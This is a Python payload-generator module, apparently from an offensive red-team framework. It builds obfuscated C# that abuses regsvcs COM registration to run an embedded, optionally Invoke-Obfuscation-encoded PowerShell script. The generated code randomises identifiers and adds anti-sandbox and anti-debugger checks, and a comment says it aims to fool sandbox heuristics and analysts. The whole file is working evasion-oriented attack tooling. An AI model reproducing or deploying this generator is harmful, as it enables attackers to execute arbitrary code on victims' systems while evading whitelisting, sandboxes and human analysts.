"""

regsvcs C# unmanaged powershell embedded script execution.
Uses basic variable renaming obfuscation.
Optional: Obfuscate powershell embedded script with Invoke-Obfuscation

Module built by @ConsciousHacker

"""

import base64
from Tools.Bypass.bypass_common import bypass_helpers
from Tools.Bypass.bypass_common import gamemaker
from Tools.Bypass.bypass_common import invoke_obfuscation


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "regsvcs_powershell"
        self.extension = "cs"
        self.rating = "Excellent"
        self.description = "regsvcs C# unmanaged powershell embedded script execution"
        self.name = "regsvcs C# Unmanaged powershell embedded script execution"
        self.path = "regsvcs/powershell/script"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_DLL" : ["Y", "Compile to a DLL"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
                                    "USERNAME"       : ["X", "Optional: The required user account"],
                                    "DEBUGGER"       : ["X", "Optional: Check if debugger is attached"],
                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"],
                                    "SCRIPT"         : ["/root/script.ps1", "Path of the powershell script"],
                                    "FUNCTION"       : ["X", "Optional: Function to execute within the powershell script"],
                                    "OBFUSCATION"    : ["X", "Optional: Use python Invoke-Obfuscation on the powershell script (binary or ascii)"]
                                }


    def generate(self):
        options = []
        for option in self.cli_opts.c:
            if "," in option:
                options = option.split(",")
            if " " in option:
                options = option.split(" ")

        for o in options:
            for i in self.required_options:
                if i in o:
                    self.required_options[i][0] = o.strip("{0}=".format(i))
        with open(self.required_options["SCRIPT"][0], "r") as f:
            the_script = f.read()

        if self.required_options["FUNCTION"][0].lower() != "x":
            # Append FUNCTION to end of script
            the_script += "\n{0}".format(self.required_options["FUNCTION"][0])
            FunctionName = self.required_options["FUNCTION"][0]

        if self.required_options["OBFUSCATION"][0].lower() != "x":
            if self.required_options["OBFUSCATION"][0].lower() == "binary":
                the_script = invoke_obfuscation.binaryEncode(the_script)
            elif self.required_options["OBFUSCATION"][0].lower() == "ascii":
                the_script = invoke_obfuscation.asciiEncode(the_script)
            else:
                the_script = invoke_obfuscation.binaryEncode(the_script)

        # randomize all our variable names, yo'
        className = bypass_helpers.randomString()
        classNameTwo = bypass_helpers.randomString()
        namespace = bypass_helpers.randomString()
        key = bypass_helpers.randomString()
        execName = bypass_helpers.randomString()

        num_tabs_required = 0

        # get random variables for the API imports
        r = [bypass_helpers.randomString() for x in range(16)]
        y = [bypass_helpers.randomString() for x in range(17)]

        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Threading; using System.EnterpriseServices; using System.Runtime.InteropServices; using System.Windows.Forms;using System.Reflection; using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text;\n"
        payload_code += "namespace {0}\n {{".format(namespace)
        payload_code += "\n\tpublic class {0} : ServicedComponent {{\n".format(className)
        # placeholder for legitimate C# program
        # lets add a message box to throw offf sandbox heuristics and analysts :)
        payload_code += '\n\t\tpublic {0}() {{ Console.WriteLine("doge"); }}\n'.format(className)
        payload_code += "\n\t\t[ComRegisterFunction]"
        payload_code += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classNameTwo, execName)
        payload_code += "\n[ComUnregisterFunction]"
        payload_code += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameTwo, execName)

        payload_code += "\n\tpublic class {0}\n\t{{".format(classNameTwo)
        payload_code += "\n\t\tpublic static void {0}() {{\n".format(execName)
        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2

        encodedScript = bypass_helpers.randomString()
        encodedScriptContents = base64.b64encode(bytes(the_script, 'latin-1')).decode('ascii')
        powershellCmd = bypass_helpers.randomString()
        data = bypass_helpers.randomString()
        command = bypass_helpers.randomString()
        RunPSCommand = bypass_helpers.randomString()
        cmd = bypass_helpers.randomString()
        runspace = bypass_helpers.randomString()
        scriptInvoker = bypass_helpers.randomString()
        pipeline = bypass_helpers.randomString()
        results = bypass_helpers.randomString()
        stringBuilder = bypass_helpers.randomString()
        obj = bypass_helpers.randomString()
        RunPSFile = bypass_helpers.randomString()
        script = bypass_helpers.randomString()
        ps = bypass_helpers.randomString()
        e = bypass_helpers.randomString()

        payload_code += """string {0} = "{1}";
                    string {2} = "";

                    byte[] {3} = Convert.FromBase64String({0});
                    string {4} = Encoding.ASCII.GetString({3});
                    {2} = {4};

                    try
                    {{
                        Console.Write({5}({2}));
                    }}
                    catch (Exception {6})
                    {{
                        Console.Write({6}.Message);
                    }}""".format(encodedScript, encodedScriptContents, powershellCmd, data, command, RunPSCommand, e)

        while (num_tabs_required != 0):
            payload_code += '\t' * num_tabs_required + '}'
            num_tabs_required -= 1

        payload_code +="""}}

                public static string {0}(string {1})
                {{

                    Runspace {2} = RunspaceFactory.CreateRunspace();
                    {2}.Open();
                    RunspaceInvoke {3} = new RunspaceInvoke({2});
                    Pipeline {4} = {2}.CreatePipeline();


                    {4}.Commands.AddScript({1});


                    {4}.Commands.Add("Out-String");
                    Collection<PSObject> {5} = {4}.Invoke();
                    {2}.Close();


                    StringBuilder {6} = new StringBuilder();
                    foreach (PSObject {7} in {5})
                    {{
                        {6}.Append({7});
                    }}
                    return {6}.ToString().Trim();
                 }}

                 public static void {8}(string {9})
                {{
                    PowerShell {10} = PowerShell.Create();
                    {10}.AddScript({9}).Invoke();
                }}""".format(RunPSCommand, cmd, runspace, scriptInvoker, pipeline, results, stringBuilder, obj, RunPSFile, script, ps)

        payload_code += "\n}" * 2

        self.payload_source_code = payload_code
        return
